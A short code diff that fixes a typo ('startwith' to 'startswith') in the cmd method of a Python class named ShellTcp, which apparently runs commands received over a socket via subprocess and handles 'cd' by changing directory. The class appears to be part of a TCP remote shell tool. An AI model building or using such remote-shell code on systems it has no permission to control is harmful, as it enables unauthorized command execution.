@@ -32,7 +32,7 @@ class ShellTcp:
         self.socket.send(f"[-] error {e}")
   def cmd(self, server, data):
     try:
-      if data.startwith("cd "):
+      if data.startswith("cd "):
         os.chdir(data [3:].strip())
         return
       p = subprocess.Popen(
